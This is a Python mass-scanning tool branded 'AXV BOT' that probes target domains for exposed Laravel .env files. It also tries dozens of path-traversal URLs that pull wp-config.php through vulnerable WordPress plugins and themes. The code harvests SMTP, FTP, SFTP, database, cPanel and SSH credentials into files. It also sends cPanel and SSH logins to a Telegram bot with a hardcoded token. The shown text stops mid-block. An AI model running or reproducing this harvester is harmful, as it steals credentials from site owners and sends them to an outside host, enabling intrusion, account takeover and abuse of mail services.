import requests
import sys
import time
import re, socket
import os
from pystyle import Colors,Colorate,Write
from fake_useragent import UserAgent
from colorama import Fore,Style,init
from rich import print as cetak
from multiprocessing.dummy import Pool, Lock, Semaphore
import requests,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool
init(autoreset=True)
headersx = {'User-Agent': UserAgent().random}
red = Fore.RED
green = Fore.GREEN 
yellow = Fore.YELLOW
white = Fore.WHITE
blue = Fore.BLUE
MAX_THREADS = 50
thread_semaphore = Semaphore(MAX_THREADS)
thread_lock = Lock()
def clear():
	if sys.platform.startswith('linux'):
		os.system('clear')
	elif sys.platform.startswith('freebsd'):
		os.system('clear')
	else:
		os.system('cls')

def gui():
	Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
	text = f""" 
 █████╗ ██╗  ██╗██╗   ██╗    ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗██╔╝██║   ██║    ██╔══██╗██╔═══██╗╚══██╔══╝
███████║ ╚███╔╝ ██║   ██║    ██████╔╝██║   ██║   ██║   
██╔══██║ ██╔██╗ ╚██╗ ██╔╝    ██╔══██╗██║   ██║   ██║   
██║  ██║██╔╝ ██╗ ╚████╔╝     ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      ╚═════╝  ╚═════╝    ╚═╝  

# CREATED BY : t.me/AXVDIGITAL
# TOOLS NAME : LARAVEL ENV & REVSLIDER SCANNER"""
	for N, line in enumerate(text.split("\n")):
		print(Colorate.Horizontal(Colors.red_to_green, line, 1))
		time.sleep(0.05)
	Write.Print("\n─══════════════════════════ቐቐ══════════════════════════─\n\n", Colors.blue_to_purple, interval=0.01)
def env(domain, id_tele):
	list = ['/.env', '/core/.env', '/web/.env', '/app/.env', '/laravel/.env', '/crm/.env', '/backend/.env', '/local/.env', '/application/.env', '/admin/.env', '/prod/.env', '/api/.env', '/config/.env', '/configuration/.env', '/env/.env', '/cfg/.env', '/settings/.env', '/conf/.env', '/env_files/.env', '/envs/.env', '/env_files/env', '/hidden/.env', '/includes/.env', '/secure/.env', '/private/.env', '/resources/.env', '/uploads/.env', '/secrets/.env', '/misc/.env', '/database/.env', '/secrets/database.env', '/protected/.env', '/temp/.env', '/backups/.env', '/logs/.env', '/configurations/.env', '/tmp/.env', '/vars/.env', '/vars/config.env', '/config/envs/.env', '/env_config/.env', '/configs/.env', '/local_config/.env', '/custom/.env', '/custom_config/.env', '/custom_env/.env', '/dev/.env', '/blog/.env', '/wp-admin/.env', '/project/.env', '/wp-includes/.env', '/wp-content/.env', '/shop/.env', '/test/.env', '/src/.env', '/production/.env', '/new/.env', '/home/.env', '/log/.env', '/index/.env', '/assets/.env', '/storage/.env', '/vendor/.env', '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
             '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
             '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
             '/wp-content/force-download.php?file=../wp-config.php',
             '/force-download.php?file=wp-config.php',
             '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
             '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
             '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
             '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
             '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
             '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
             '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
             '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
             '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
             '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
             '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
             '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
             '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
             '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php']
	for name in list:
		try:
			domain = ''.join(domain)
			domain = domain.strip()
			domain = re.sub(r'https?://', '', domain)
			ua = {'User-Agent': UserAgent().random}
			to_domain = requests.get(f"http://{domain}{name}", headers=ua, timeout=7, verify=False).text
			ipdomen = socket.gethostbyname(domain)
			if 'APP_NAME=' in to_domain and 'DB_HOST=' in to_domain:
				with thread_lock:
					open("results/env.txt","a+").write(f"http://{domain}{name}\n")
					print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found LARAVEL!")
				appkeyrce = re.findall('\sAPP_KEY=base64:(.*?)\s', to_domain)
				appkeyrce = ''.join(appkeyrce)
				with thread_lock:
					open("results/appkey.txt","a+").write('http://' + domain + ' | APP_KEY=' + appkeyrce + "\n")
					emailaws = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', to_domain)
				if len(emailaws) == 0:
					pass
				else:open('results/amazonmail.txt', 'a+').write(emailaws + '\n')
				#othersmtp
				rocmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				rocmailhost = ''.join(rocmailhost)
				rocmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				rocmailport = ''.join(rocmailport)
				rocmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				rocmailuser = ''.join(rocmailuser)
				rocmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				rocmailpass = ''.join(rocmailpass)
				rocmailadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', to_domain)
				rocmailadd = ''.join(rocmailadd)
				rocmailname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', to_domain)
				rocmailname = ''.join(rocmailname)
				if '.gmail.com' in to_domain or 'secure.emailsrvr.com' in to_domain or 'smtp.mailgun.org' in to_domain or '.mailjet.com' in to_domain or 'smtp-relay.sendinblue.com' in to_domain or 'smtp.mandrillapp.com' in to_domain or 'smtp.zoho.com' in to_domain or 'smtp.ionos.com' in to_domain or 'smtp.office365.com' in to_domain or 'smtp.1and1' in to_domain or 'smtp.sendgrid.net' in to_domain or 'email-smtp.us-south-1.amazonaws.com' in to_domain or 'smtp.mailtrap.io' in to_domain:
					pass
				else:
					with thread_lock:
						open("results/other_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={rocmailhost}\n[+] MAIL_PORT={rocmailport}\n[+] MAIL_USERNAME={rocmailuser}\n[+] MAIL_PASSWORD={rocmailpass}\n[+] MAIL_FROM_ADDRESS={rocmailadd}\n[+] MAIL_FROM_NAME={rocmailname}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found OTHER SMTP!")
				#ionos
				iomailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				iomailhost = ''.join(iomailhost)
				iomailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				iomailport = ''.join(iomailport)
				iomailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				iomailuser = ''.join(iomailuser)
				iomailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				iomailpass = ''.join(iomailpass)
				iomailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				iomailenc = ''.join(iomailenc)
				if 'smtp.ionos.com' in to_domain:
					with thread_lock:
						open("results/ionos_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={iomailhost}\n[+] MAIL_PORT={iomailport}\n[+] MAIL_USERNAME={iomailuser}\n[+] MAIL_PASSWORD={iomailpass}\n[+] MAIL_ENCRYPTION={iomailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found IONOS SMTP!")
				else:pass
				#yahoo
				yahmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				yahmailhost = ''.join(yahmailhost)
				yahmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				yahmailport = ''.join(yahmailport)
				yahmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				yahmailuser = ''.join(yahmailuser)
				yahmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				yahmailpassw = ''.join(yahmailpassw)
				yahmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				yahmailenc = ''.join(yahmailenc)
				if 'smtp.yahoo.com' in to_domain:
					with thread_lock:
						open("results/yahoo_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={yahmailhost}\n[+] MAIL_PORT={yahmailport}\n[+] MAIL_USERNAME={yahmailuser}\n[+] MAIL_PASSWORD={yahmailpassw}\n[+] MAIL_ENCRYPTION={yahmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found YAHOO SMTP!")
				else:pass
				#outlook
				outmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				outmailhost = ''.join(outmailhost)
				outmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				outmailport = ''.join(outmailport)
				outmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				outmailuser = ''.join(outmailuser)
				outmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				outmailpassw = ''.join(outmailpassw)
				outmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				outmailenc = ''.join(outmailenc)
				if 'smtp-mail.outlook.com' in to_domain:
					with thread_lock:
						open("results/outlook_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={outmailhost}\n[+] MAIL_PORT={outmailport}\n[+] MAIL_USERNAME={outmailuser}\n[+] MAIL_PASSWORD={outmailpassw}\n[+] MAIL_ENCRYPTION={outmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found OUTLOOK SMTP!")
				else:pass
				#aol
				aolmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				aolmailhost = ''.join(aolmailhost)
				aolmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				aolmailport = ''.join(aolmailport)
				aolmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				aolmailuser = ''.join(aolmailuser)
				aolmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				aolmailpassw = ''.join(aolmailpassw)
				aolmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				aolmailenc = ''.join(aolmailenc)
				if 'smtp.aol.com' in to_domain:
					with thread_lock:
						open("results/aol_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={aolmailhost}\n[+] MAIL_PORT={aolmailport}\n[+] MAIL_USERNAME={aolmailuser}\n[+] MAIL_PASSWORD={aolmailpassw}\n[+] MAIL_ENCRYPTION={aolmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found AOL SMTP!")
				else:pass
				#zoho
				zohmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				zohmailhost = ''.join(zohmailhost)
				zohmailuser = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				zohmailuser = ''.join(zohmailuser)
				zohmailport = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				zohmailport = ''.join(zohmailport)
				zohmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				zohmailpass = ''.join(zohmailpass)
				zohmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				zohmailenc = ''.join(zohmailenc)
				if 'smtp.zoho.com' in to_domain:
					with thread_lock:
						open("results/zoho_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={zohmailhost}\n[+] MAIL_PORT={zohmailuser}\n[+] MAIL_USERNAME={zohmailport}\n[+] MAIL_PASSWORD={zohmailpass}\n[+] MAIL_ENCRYPTION={zohmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found ZOHO SMTP!")
				else:pass
				#ftpuser
				ftpuhost = re.findall('\sFTP_USER=(.*?)\s', to_domain)
				ftpuhost = ''.join(ftpuhost)
				ftpuport = re.findall('\sFTP_PORT=(.*?)\s', to_domain)
				ftpuport = ''.join(ftpuport)
				ftpuuser = re.findall('\sFTP_HOST=(.*?)\s', to_domain)
				ftpuuser = ''.join(ftpuuser)
				ftpupass = re.findall('\sFTP_PASS=(.*?)\s', to_domain)
				ftpupass = ''.join(ftpupass)
				if len(ftpuhost) == 0 or len(ftpupass) == 0:
					pass
				else:
					with thread_lock:
						open("results/ftpacc.txt","a+").write(f"[+] HOST={domain}{name}\n[+] FTP_USER={ftpuhost}\n[+] FTP_PORT={ftpuport}\n[+] FTP_USERNAME={ftpuuser}\n[+] FTP_PASSWORD={ftpupass}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found FTPACC!")
				#sftpuser
				sftpuhost = re.findall('\sSFTP_USER=(.*?)\s', to_domain)
				sftpuhost = ''.join(sftpuhost)
				sftpuport = re.findall('\sSFTP_PORT=(.*?)\s', to_domain)
				sftpuport = ''.join(sftpuport)
				sftpuuser = re.findall('\sSFTP_HOST=(.*?)\s', to_domain)
				sftpuuser = ''.join(sftpuuser)
				sftpupass = re.findall('\sSFTP_PASS=(.*?)\s', to_domain)
				sftpupass = ''.join(sftpupass)
				if len(sftpuhost) == 0 or len(sftpupass) == 0:
					pass
				else:
					with thread_lock:
						open("results/ftpacc.txt","a+").write(f"[+] HOST={domain}{name}\n[+] SFTP_USER={sftpuhost}\n[+] SFTP_PORT={sftpuport}\n[+] SFTP_USERNAME={sftpuuser}\n[+] SFTP_PASSWORD={sftpupass}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found SFTP!")
				#mandrillapp
				mmailhost = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', to_domain)
				mmailhost = ''.join(mmailhost)
				mmailn = re.findall('\sMAIL_FROM_NAME=(.*?)\s', to_domain)
				mmailn = ''.join(mmailn)
				mmuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				mmuser = ''.join(mmuser)
				mmpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				mmpass = ''.join(mmpass)
				if 'smtp.mandrillapp.com' in to_domain:
					with thread_lock:
						open("results/mandrillapp_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_FROM_ADDRESS={mmailhost}\n[+] MAIL_FROM_NAME={mmailn}\n[+] MAIL_USERNAME={mmuser}\n[+] MAIL_PASSWORD={mmpass}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found MANDRILLAPP SMTP!")
				else:pass
				#sendinblue
				senmailadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', to_domain)
				senmailadd = ''.join(senmailadd)
				senmailname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', to_domain)
				senmailname = ''.join(senmailname)
				senmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				senmailuser = ''.join(senmailuser)
				senmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				senmailpass = ''.join(senmailpass)
				if 'smtp-relay.sendinblue.com' in to_domain:
					with thread_lock:
						open("results/sendinblue_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_FROM_ADDRESS={senmailadd}\n[+] MAIL_FROM_NAME={senmailname}\n[+] MAIL_USERNAME={senmailuser}\n[+] MAIL_PASSWORD={senmailpass}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found SENDINBLUE SMTP!")
				else:pass
				#mailjet
				jetmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				jetmailhost = ''.join(jetmailhost)
				jetmailuser = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				jetmailuser = ''.join(jetmailuser)
				jetmailport = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				jetmailport = ''.join(jetmailport)
				jetmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				jetmailpass = ''.join(jetmailpass)
				jetmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				jetmailenc = ''.join(jetmailenc)
				if '.mailjet.com' in to_domain:
					with thread_lock:
						open("results/mailjet_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={jetmailhost}\n[+] MAIL_PORT={jetmailuser}\n[+] MAIL_USERNAME={jetmailport}\n[+] MAIL_PASSWORD={jetmailpass}\n[+] MAIL_ENCRYPTION={jetmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found MAILJET SMTP!")
				else:pass
				#mailgun
				gunmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				gunmailhost = ''.join(gunmailhost)
				gunmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				gunmailport = ''.join(gunmailport)
				gunmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				gunmailuser = ''.join(gunmailuser)
				gunmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				gunmailpass = ''.join(gunmailpass)
				gunmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				gunmailenc = ''.join(gunmailenc)
				if 'smtp.mailgun.org' in to_domain:
					with thread_lock:
						open("results/mailgun_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={gunmailhost}\n[+] MAIL_PORT={gunmailport}\n[+] MAIL_USERNAME={gunmailuser}\n[+] MAIL_PASSWORD={gunmailpass}\n[+] MAIL_ENCRYPTION={gunmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found MAILGUN SMTP!")
				else:pass
				#EMAILSRVR
				srvmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				srvmailhost = ''.join(srvmailhost)
				srvmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				srvmailport = ''.join(srvmailport)
				srvmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				srvmailuser = ''.join(srvmailuser)
				srvmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				srvmailpass = ''.join(srvmailpass)
				srvmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				srvmailenc = ''.join(srvmailenc)
				if 'secure.emailsrvr.com' in to_domain:
					with thread_lock:
						open("results/rackspace_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={srvmailhost}\n[+] MAIL_PORT={srvmailport}\n[+] MAIL_USERNAME={srvmailuser}\n[+] MAIL_PASSWORD={srvmailpass}\n[+] MAIL_ENCRYPTION={srvmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found RACKSPACE!")
				else:pass
				#office
				omailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				omailhost = ''.join(omailhost)
				omailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				omailport = ''.join(omailport)
				omailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				omailuser = ''.join(omailuser)
				omailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				omailpass = ''.join(omailpass)
				omailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				omailenc = ''.join(omailenc)
				if 'smtp.office365.com' in to_domain:
					with thread_lock:
						open("results/office_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={omailhost}\n[+] MAIL_PORT={omailport}\n[+] MAIL_USERNAME={omailuser}\n[+] MAIL_PASSWORD={omailpass}\n[+] MAIL_ENCRYPTION={omailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found OFFICE SMTP!")
				else:pass
				#1and1
				onehost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				onehost = ''.join(onehost)
				oneport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				oneport = ''.join(oneport)
				oneuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				oneuser = ''.join(oneuser)
				onepass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				onepass = ''.join(onepass)
				if 'smtp.1and1' in to_domain:
					with thread_lock:
						open("results/1and1_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={onehost}\n[+] MAIL_PORT={oneport}\n[+] MAIL_USERNAME={oneuser}\n[+] MAIL_PASSWORD={onepass}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found 1AND1 SMTP!")
				else:pass
				#sendgrind
				smailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				smailhost = ''.join(smailhost)
				smailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				smailport = ''.join(smailport)
				smailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				smailuser = ''.join(smailuser)
				smailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				smailpass = ''.join(smailpass)
				smailfrom = re.findall('\sMAIL_FROM_NAME=(.*?)\s', to_domain)
				smailfrom = ''.join(smailfrom)
				if 'smtp.sendgrid.net' in to_domain:
					with thread_lock:
						open("results/sendgrid_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={smailhost}\n[+] MAIL_PORT={smailport}\n[+] MAIL_USERNAME={smailuser}\n[+] MAIL_PASSWORD={smailpass}\n[+] MAIL_FROM_NAME={smailfrom}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found SENDGRID SMTP!")
				else:pass
				#mailtrap
				trapmailusesr = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				trapmailusesr = ''.join(trapmailusesr)
				trapmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				trapmailport = ''.join(trapmailport)
				trapmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				trapmailuser = ''.join(trapmailuser)
				trapmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				trapmailpass = ''.join(trapmailpass)
				trapmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', to_domain)
				trapmailenc = ''.join(trapmailenc)
				if 'smtp.mailtrap.io' in to_domain:
					with thread_lock:
						open("results/mailtrap_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={trapmailusesr}\n[+] MAIL_PORT={trapmailport}\n[+] MAIL_USERNAME={trapmailuser}\n[+] MAIL_PASSWORD={trapmailpass}\n[+] MAIL_ENCRYPTION={trapmailenc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found MAILTRAP SMTP!")
				else:pass
				#gmail
				gmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				gmailhost = ''.join(gmailhost)
				gmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				gmailport = ''.join(gmailport)
				gmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				gmailuser = ''.join(gmailuser)
				gmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				gmailpassw = ''.join(gmailpassw)
				gmailfadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', to_domain)
				gmailfadd = ''.join(gmailfadd)
				gmailfname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', to_domain)
				gmailfname = ''.join(gmailfname)
				if '.gmail.com' in to_domain:
					with thread_lock:
						open("results/gmail_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={gmailhost}\n[+] MAIL_PORT={gmailport}\n[+] MAIL_USERNAME={gmailuser}\n[+] MAIL_PASSWORD={gmailpassw}\n[+] MAIL_FROM_ADDRESS={gmailfadd}\n[+] MAIL_FROM_NAME={gmailfname}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found GMAIL SMTP!")
				else:pass
				#database
				dbhost = re.findall('\sDB_HOST=(.*?)\s', to_domain)
				dbhost = ''.join(dbhost)
				dbport = re.findall('\sDB_PORT=(.*?)\s', to_domain)
				dbport = ''.join(dbport)
				dbdata = re.findall('\sDB_DATABASE=(.*?)\s', to_domain)
				dbdata = ''.join(dbdata)
				dbuser = re.findall('\sDB_USERNAME=(.*?)\s', to_domain)
				dbuser = ''.join(dbuser)
				dbpassw = re.findall('\sDB_PASSWORD=(.*?)\s', to_domain)
				dbpassw = ''.join(dbpassw)
				if 'DB_HOST' not in to_domain:
					pass
				else:
					with thread_lock:
						open("results/db_data.txt","a+").write(f"[+] HOST={domain}{name}\nDB_HOST={dbhost}\nDB_PORT={dbport}\nDB_DATABASE={dbdata}\nDB_USERNAME={dbuser}\nDB_PASSWORD={dbpassw}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found DB_DATA!")
				#cpannelcracked
				cpckuser = re.findall('\sDB_USERNAME=(.*?)\s', to_domain)
				cpckuser = ''.join(cpckuser)
				cpckpass = re.findall('\sDB_PASSWORD=(.*?)\s', to_domain)
				cpckpass = ''.join(cpckpass)
				if 'DB_PORT=3306' in to_domain or 'DB_CONNECTION=mysql' in to_domain:
					if len(cpckuser) == 0 or len(cpckpass) == 0:
						pass
					else:
						with thread_lock:
							open("results/cpannel.txt","a+").write(f"http://{domain}:2083 {cpckuser}:{cpckpass}\n")
							print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found CPANNEL!")
					requests.get(f'https://api.telegram.org/bot5895414600:AAHnaaJ2S3DaAPRWgUrfNmgKrvDynmLK0zI/sendMessage?chat_id={id_tele}&text=http://{domain}:2083 {cpckuser}:{cpckpass}\n|- FOUND CPANNEL!', headers=headersx, timeout=20)
				else:pass
				#cpannelcracked2
				cpckuser2 = re.findall('\sCPANEL_USERNAME=(.*?)\s', to_domain)
				cpckuser2 = ''.join(cpckuser2)
				cpckpass2 = re.findall('\sCPANEL_PASSWORD=(.*?)\s', to_domain)
				cpckpass2 = ''.join(cpckpass2)
				if len(cpckuser2) == 0 or len(cpckpass2) == 0:
					pass
				else:
					with thread_lock:
						open("results/cpannel.txt","a+").write(f"http://{domain}:2083 {cpckuser2}:{cpckpass2}\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found CPANNEL!")
					requests.get(f'https://api.telegram.org/bot5895414600:AAHnaaJ2S3DaAPRWgUrfNmgKrvDynmLK0zI/sendMessage?chat_id={id_tele}&text=http://{domain}:2083 {cpckuser2}:{cpckpass2}\n|- FOUND CPANNEL!', headers=headersx, timeout=20)
				#ssh
				sshckuser = re.findall('\sDB_USERNAME=(.*?)\s', to_domain)
				sshckuser = ''.join(sshckuser)
				sshckpass = re.findall('\sDB_PASSWORD=(.*?)\s', to_domain)
				sshckpass = ''.join(sshckpass)
				if 'DB_PORT=3306' in to_domain or 'DB_HOST=127.0.0.1' in to_domain or 'DB_CONNECTION=mysql' in to_domain:
					if len(sshckuser) == 0 or len(sshckpass) == 0:
						pass
					else:
						open('results/ssh.txt', 'a+').write(f"ssh {sshckuser}@{ipdomen} -p 22:{sshckpass}:{domain}\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found SSH!")
					requests.get(f'https://api.telegram.org/bot5895414600:AAHnaaJ2S3DaAPRWgUrfNmgKrvDynmLK0zI/sendMessage?chat_id={id_tele}&text=ssh {sshckuser}@{ipdomen} -p 22:{sshckpass}:{domain}\n|- FOUND SSH!', headers=headersx, timeout=20)
				else:pass
				#amazon_smtp
				azmailhost = re.findall('\sMAIL_HOST=(.*?)\s', to_domain)
				azmailhost = ''.join(azmailhost)
				azmailport = re.findall('\sMAIL_PORT=(.*?)\s', to_domain)
				azmailport = ''.join(azmailport)
				azmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', to_domain)
				azmailuser = ''.join(azmailuser)
				azmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', to_domain)
				azmailpass = ''.join(azmailpass)
				azmailadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', to_domain)
				azmailadd = ''.join(azmailadd)
				azmailname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', to_domain)
				azmailname = ''.join(azmailname)
				if '.amazonaws.com' not in to_domain:
					pass
				else:
					if len(azmailuser) == 0 or len(azmailpass) == 0:
						pass
					else:
						with thread_lock:
